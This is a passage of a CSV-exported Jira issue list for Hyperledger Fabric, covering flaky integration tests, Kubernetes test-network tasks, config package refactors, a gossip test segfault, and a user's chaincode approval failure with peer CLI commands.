2020-03-12T19:08:55.2271402Z FAIL! -- 21 Passed | 1 Failed | 0 Pending | 0 Skipped",,caod,sykesm,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Mar/20 11:47 PM;caod;03-16-20.txt;https://jira.hyperledger.org/secure/attachment/18173/03-16-20.txt","13/Mar/20 10:06 PM;sykesm;pvtdata-2.log;https://jira.hyperledger.org/secure/attachment/18171/pvtdata-2.log","13/Mar/20 5:10 AM;sykesm;pvtdata.log;https://jira.hyperledger.org/secure/attachment/18169/pvtdata.log",,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00wur:0id",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,sykesm,wenjian,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"13/Mar/20 10:03 PM;sykesm;Hit again on PR opened by a member of the community.

https://dev.azure.com/Hyperledger/0227bd2c-c4f6-478f-be00-ee519f115180/_apis/build/builds/9838/logs/70

Attaching logs in a moment.;;;","16/Mar/20 11:47 PM;caod;Hit again [https://dev.azure.com/Hyperledger/Fabric/_build/results?buildId=9939&view=logs&jobId=7e1dd684-043b-58f9-3f54-f4b0baeb1973&j=7e1dd684-043b-58f9-3f54-f4b0baeb1973&t=83158a86-181c-5d3d-be25-1c6af30d94c1] see attached;;;","21/Mar/20 2:28 AM;wenjian;PR: https://github.com/hyperledger/fabric/pull/895;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Intermittent test failure in pvtdata integration - when pulling is disabled when collection config does not have maxPeerCount or requiredPeerCount [It] disseminates private data per collections_config7 with default maxPeerCount and requiredPeerCount ,FAB-17612,44554,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Duplicate,,sykesm,sykesm,13/Mar/20 5:28 AM,19/Mar/20 6:20 AM,28/Oct/23 3:09 AM,19/Mar/20 6:20 AM,v2.x,,,,,,,,,,,,,fabric-ledger,,,,,,,,,0,ci-flake,,,,,"[https://dev.azure.com/Hyperledger/0227bd2c-c4f6-478f-be00-ee519f115180/_apis/build/builds/9796/logs/79]

 
{code:java}
2020-03-12T20:00:19.4865691Z â€¢ Failure [51.841 seconds]
2020-03-12T20:00:19.4867158Z PrivateData Dissemination when pulling is disabled when collection config does not have maxPeerCount or requiredPeerCount [It] disseminates private data per collections_config7 with default maxPeerCount and requiredPeerCount 
2020-03-12T20:00:19.4868224Z /home/vsts/work/1/go/src/github.com/hyperledger/fabric/integration/pvtdata/pvtdata_test.go:146
2020-03-12T20:00:19.4868554Z 
2020-03-12T20:00:19.4868864Z   Expected
2020-03-12T20:00:19.4869051Z       <int>: 2
2020-03-12T20:00:19.4869237Z   to equal
2020-03-12T20:00:19.4869573Z       <int>: 1
2020-03-12T20:00:19.4869719Z 
2020-03-12T20:00:19.4870621Z   /home/vsts/work/1/go/src/github.com/hyperledger/fabric/integration/pvtdata/pvtdata_test.go:1294 {code}",,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17601,,,,,,,,,,,,,"13/Mar/20 5:27 AM;sykesm;pvtdata-2.txt;https://jira.hyperledger.org/secure/attachment/18170/pvtdata-2.txt",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i019y3:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
correcting misspelled words,FAB-17613,44555,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Lowest,Done,Eggsy,Eggsy,Eggsy,13/Mar/20 1:38 PM,13/Mar/20 11:01 PM,28/Oct/23 3:09 AM,13/Mar/20 11:01 PM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"1. Add consensus type ectdraft in orderer.yaml
2. Correcting misspelled words

example:

faile/ dessemination/ communiction",,Eggsy,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i019yb:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Eggsy,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Stand Up Network Using Azure,FAB-17614,44564,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,suryalnvs,btl5037,btl5037,13/Mar/20 11:09 PM,12/Jun/20 2:10 AM,28/Oct/23 3:09 AM,12/Jun/20 2:10 AM,v1.x,v2.x,,,,,,,,v1.x,v2.x,,,fabric-quality,,,,,,,,,0,,,,,,"As part of our future permanent network test scenarios, we need to stand up a Kubernetes-based network.

Since the intent is to remove and add nodes dynamically we can start with simple topologies:
 * 2 orgs
 * 2 peers with CA's
 * 5 orderers
 * 1 channel
 * Java, Node and Go chaincode types

We need to launch these networks via Azure once the launch pipeline is ready so we can make use of 

 ",,btl5037,suryalnvs,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10080,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8zwa",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,suryalnvs,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"20/Apr/20 10:16 PM;suryalnvs;Launched network with 5 orderers with 2 organizations and 2 peers in each. Created 1 channel and joined all 4 peers to the channel.

Installed and instantiated map_private chaincode using peer chaincode lifecycle. Also pushed the network related artifacts to jfrog artifactory. 

[https://github.com/hyperledger/fabric-test/pull/175|https://github.com/hyperledger/fabric-test/pull/175-];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Create Azure Pipeline for Deploying Networks in Kube and Saving Artifacts,FAB-17615,44565,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,btl5037,btl5037,13/Mar/20 11:12 PM,23/Apr/20 2:13 AM,28/Oct/23 3:09 AM,23/Apr/20 2:13 AM,,,,,,,,,,v2.x,,,,fabric-quality,,,,,,,,,0,,,,,,"To support the stand up of detachable network in Kubernetes we need a pipeline that can stand up networks and cache their artifacts for consumption by other jobs.

Originally we intended to be able to reference the artifacts of this pipeline in our future pipelines but they are no longer retained indefinitely. So maybe we can store them as config maps or secrets in the clusters, or we can use IBM Object Store to store them as a tarball (this may make more sense as we can just curl the URL and get the tarball later).",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-10080,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8zwk",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add Tests for Private and Transient Data,FAB-17616,44566,,Test Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid,,btl5037,btl5037,13/Mar/20 11:15 PM,05/Apr/20 11:33 AM,28/Oct/23 3:09 AM,13/Mar/20 11:56 PM,,,,,,,,,,v2.x,,,,fabric-quality,,,,,,,,,0,,,,,,"Now that we've addressed support for all chaincode types, we can begin adding scenarios to test both private data and transient maps.

Let's identify which chaincodes we want to run and document them here",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwqhw:",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Document Chaincode,FAB-17617,44567,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,,btl5037,btl5037,13/Mar/20 11:16 PM,11/Jan/21 3:06 AM,28/Oct/23 3:09 AM,11/Jan/21 3:06 AM,,,,,,,,,,v2.x,,,,fabric-quality,,,,,,,,,0,,,,,,We need to add a README to the chaincode directory to document what each of the chaincodes are testing. Today it is impossible for anyone who didn't write the chaincode to figure out what the differences are between chaincodes.,,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0192i:ri",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Clean Up and Properly Configure Kubernetes Clusters,FAB-17618,44568,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,btl5037,btl5037,btl5037,13/Mar/20 11:19 PM,25/Mar/20 2:57 AM,28/Oct/23 3:09 AM,25/Mar/20 2:57 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"Today we have 3 kube clusters. Let remove and recreate them with descriptive names and single instances of log DNA, with Prometheus and Grafana (with a database backing it) preconfigured. Lets save the commands in scripts used to deploy Helm and Grafana in the Fabric-Test repo so we can recreate these deployments if necessary later",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8zwy",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"25/Mar/20 2:55 AM;btl5037;Removed the existing clusters, storage volumes, LogDNA and SysDig instances.;;;","25/Mar/20 2:56 AM;btl5037;Created a new Kubernetes cluster in the IBM Cloud, `community-test`.;;;","25/Mar/20 2:56 AM;btl5037;Deployed LogDNA;;;","25/Mar/20 2:57 AM;btl5037;Deployed Prometheus and Grafana backed by MySQL;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Wrap config transaction proto and move API to wrapped type,FAB-17619,44569,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tsharris,caod,caod,13/Mar/20 11:29 PM,27/Mar/20 4:01 AM,28/Oct/23 3:09 AM,26/Mar/20 11:47 PM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ipm,,,,,"Currently we pass a config object around to every update/API function, lets wrap the config proto so this:
{code:java}
err := UpdateOrdererConfiguration(config, orderer)
{code}
becomes something like
{code:java}
err := config.UpdateOrdererConfiguration(orderer){code}
 ",,caod,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzj",,,,Unset,Unset,,(Please add steps to reproduce),2.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,tsharris,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"16/Mar/20 11:15 PM;caod;Shadow with state before changing;;;","24/Mar/20 11:18 PM;tsharris;[https://github.com/hyperledger/fabric/pull/880];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Revisit reference types in config package,FAB-17620,44570,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dereckluo,caod,caod,13/Mar/20 11:39 PM,24/Mar/20 9:01 PM,28/Oct/23 3:09 AM,23/Mar/20 10:30 PM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ipm,,,,,"In FAB-17582 we converted many of the types on the config API to values instead of references. There are a couple of places where this probably doesn't make that much sense, notably around the x509 certificates and other MSP related types since these types would need to be passed by reference anyways when using the crypto library. Let's revisit and get it right this time.",,caod,dereckluo,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzji",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,dereckluo,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"21/Mar/20 1:46 AM;dereckluo;https://github.com/hyperledger/fabric/pull/892;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Generate certs/keys/CRLs in pkg/config unit tests,FAB-17621,44572,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,caod,caod,14/Mar/20 12:36 AM,25/Mar/20 4:06 AM,28/Oct/23 3:09 AM,24/Mar/20 12:41 AM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ipm,,,,,We use a dummy cert/private key/crl in the msp_test to avoid dynamically generating one and needing to modify the test assertion. We should -document how these are actually generated and what's supported.-  generate the certs/keys/CRLs instead.,,AloYangYuu,caod,sykesm,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzjr",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),AloYangYuu,caod,sykesm,wlahti,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"16/Mar/20 11:23 PM;sykesm;One example of how we can generate certs ""on-demand"" via code: core/comm/testdata/certs/generate.go;;;","20/Mar/20 11:34 PM;wlahti;I'm currently working to dynamically generate these certs instead. If all goes according to plan, I'll update this story to reflect that we're generating them now (and no need to document the existing static certs/crls).;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add brief video on how to submit a PR to github,FAB-17622,44575,,Documentation,Backlog,FAB,Fabric,software,denyeart,,,Medium,,joe-alewine,pandrejko,pandrejko,14/Mar/20 1:23 AM,31/Mar/20 4:12 AM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,,,,,,"With moving content from Gerrit to Github, we are seeing a real increase in first time contributors. But there is a problem with them forgetting to sign their commits even though it is documented in the Contributing guide.

Suggestion was made to
1) Add a link to the Contributing guide from the Fabric readme.
2) Create a short 1 minute video that shows the process for creating and submitting a PR. Joe was nominated :-) Publish it on the Hyperledger Fabric YouTube channel.",,pandrejko,silliman,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwrrq:65jjf",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),pandrejko,silliman,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"31/Mar/20 4:12 AM;pandrejko;https://wiki.hyperledger.org/download/attachments/24773827/2020.03.20.DWG.West.all.mp4?api=v2
Demonstration  starts at 20:13 in the video;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
orderer org should not have OrdererAddresses in it's Values,FAB-17623,44579,,Bug,Closed,FAB,Fabric,software,denyeart,,,Lowest,Done,xwu,xwu,xwu,15/Mar/20 12:19 AM,19/Mar/20 1:12 AM,28/Oct/23 3:09 AM,17/Mar/20 11:10 PM,v2.0.0,v2.0.1,,,,,,,,,,,,,,,,,,,,,0,,,,,,"In common.Config, an orderer org's Values (map[string]*cb.ConfigValue) can only have MSP or Endpoints as its key. However, in the pkg/config/example_test.go file, the function fetchChannelConfig returns a Config with an orderer org OrdererOrg, but the OrdererOrg's Values has a key of ""OrdererAddresses"". That is the mistake.",,xwu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i019zf:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),xwu,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"17/Mar/20 11:10 PM;xwu;https://github.com/hyperledger/fabric/pull/858;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
SEGFAULT in gossip unit tests,FAB-17624,44583,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,sykesm,sykesm,16/Mar/20 11:49 AM,16/Mar/20 11:38 PM,28/Oct/23 3:09 AM,16/Mar/20 11:38 PM,v2.1.0,,,,,,,,,,,,,fabric-gossip,,,,,,,,,0,,,,,,"One of the gossip tests panics in vendored code. 
{code}
panic: runtime error: invalid memory address or nil pointer dereference
        panic: runtime error: invalid memory address or nil pointer dereference
[signal SIGSEGV: segmentation violation code=0x1 addr=0x28 pc=0xade84b]


goroutine 2471 [running]:
github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*listenSocket).Close(0xc0036fbf00, 0xc003c1e900, 0xc003222490)
        /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:533 +0x4b
github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).Serve.func2(0xc000528580, 0xc0036fbf00)
        /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:577 +0xa9
panic(0xde0740, 0x158cd80)
        /usr/local/go/src/runtime/panic.go:973 +0x396
github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).Serve(0xc000528580, 0x0, 0x0, 0x0, 0x0)
        /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:586 +0x304
created by github.com/hyperledger/fabric/gossip/discovery.createDiscoveryInstanceThatGossipsWithInterceptors
        /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/gossip/discovery/discovery_test.go:422 +0xb5e
{code}

The source of the nil listener that caused the panic is hidden in the noise generated by the tests.
{code}
2020-03-15T22:37:11.059-0400    INFO    discovery/discovery_impl.go:1059        Removing member: Endpoint: foo, InternalEndpoint: , PKIID:
Error listening on :42612, listen tcp :42612: bind: address already in use2020-03-15 22:37:11.079 EDT [gossip.discovery#localhost:22612] getDeadMembers -> WARN 002 Haven't h
eard from [108 111 99 97 108 104 111 115 116 58 50 50 54 49 48] for 3.018821637s
{code}

Instead of just printing the error
{code}
    ll, err := net.Listen(""tcp"", listenAddress)                                                                                                                              
    if err != nil {                                                                                                                                                          
        fmt.Printf(""Error listening on %v, %v"", listenAddress, err)                                                                                                          
    } 
{code}

the test should immediately fail with a clear indication of what is wrong.",,sykesm,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01a0b:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,yacovm,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"16/Mar/20 9:09 PM;yacovm;https://github.com/hyperledger/fabric/pull/863;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
approvemyorg command in chaincode lifecycle is failing in v2.0 hlf network deployment.,FAB-17625,44585,,Bug,Closed,FAB,Fabric,software,denyeart,,,Highest,Invalid: Test Error,,jarvis26,jarvis26,16/Mar/20 4:21 PM,19/Mar/20 1:00 PM,28/Oct/23 3:09 AM,19/Mar/20 1:00 PM,v2.0.0,,,,,,,,,,,,,,,,,,,,,,1,chaincode,lifecycle,raft,,,"I have a distributed hlf network deployment - not running on first-network base. Deployment topology is 1 org, 1 peer with 3 RAFT consenter nodes for Ordering Service. Certificates are generated by Fabric-CA for the peer organization and the Ordering Service Organization. The network is mutual TLS enabled. 
Peer and orderer versions: 2.0.0
golang version: go1.13.5 linux/amd64

Following are the set of commands executed to check chaincode life-cycle and the errors occurred.

export CORE_PEER_MSPCONFIGPATH=/var/hyperledger/admin/msp

*Create Channel:*
peer channel create -o orderer:7050 -c channel2 -f channel2.tx --tls --clientauth --certfile <path to certfile> --keyfile <path to keyfile> --cafile <path to orderer ca file> --timeout 500s --connTimeout 50s

*Join Channel:*
peer channel join -b channel2.block

*Package Chaincode:*
peer lifecycle chaincode package testchaincode.tar.gz --path /opt/gopath/src/github.com/hyperledger/fabric-samples/chaincode/abstore/go/ --lang golang --label chaincode

*Install Chaincode:*
peer lifecycle chaincode install testchaincode.tar.gz --tls --clientauth --certfile <path to certfile> --keyfile <path to keyfile>

*Query installed chaincode:*
peer lifecycle chaincode queryinstalled

This returns the chaincode package Id.

*Approve Chaincode:*
peer lifecycle chaincode approveformyorg -o orderer:7050 --tls --clientauth --certfile <path to certfile> --keyfile <path to keyfile> --cafile <path to orderer ca file> --channelID channel2 --name testchaincode --version 1.0 --init-required --package-id chaincode:786d2eda61346963c45cea62a9d3dd36b054741d51e45ef3b07f769e00acbb20 --sequence 1 --signature-policy ""OR ('Org1MSP.peer')"" --waitForEvent

This resulted in an error:

2020-03-04 09:12:40.996 UTC [chaincodeCmd] ClientWait -> INFO 001 txid [1fea03cbcecb0a26618871297128d87ef80f8177fb22ba6e10ea46dbfb986e8d] committed with status (ENDORSEMENT_POLICY_FAILURE) at
Error: transaction invalidated with status (ENDORSEMENT_POLICY_FAILURE)

As a workaround, I restarted the network with a new genesis block generated after commenting out the {{Endorsement}} and the {{LifecycleEndorsement}} default policies in configtx.yaml.

All the above commands succeeded as expected, except the {{approveformyorg}} command. This threw the following error:
Error at the Peer: CLI: Error: timed out waiting for txid on all peers
Modified the {{approveformyorg}} with {{--waitForEventTimeout}} flag and set it to 600s

peer lifecycle chaincode approveformyorg -o orderer:7050 --tls --clientauth --certfile <path to certfile> --keyfile <path to keyfile> --cafile <path to orderer ca file> --channelID channel2 --name chaincode --version 1.0 --init-required --package-id chaincode:786d2eda61346963c45cea62a9d3dd36b054741d51e45ef3b07f769e00acbb20 --sequence 1 --signature-policy ""OR ('Org1MSP.member')"" --waitForEventTimeout 600s

The orderer does not report any error, however the peer logs and command line show the following:
Error: Error: error receiving from deliver filtered at test-machine:7051: rpc error: code = Unavailable desc = transport is closing

*Peer logs:*
ApproveChaincodeDefinitionForOrg -> INFO 07d^[[0m Successfully endorsed chaincode approval with name 'testchaincode',
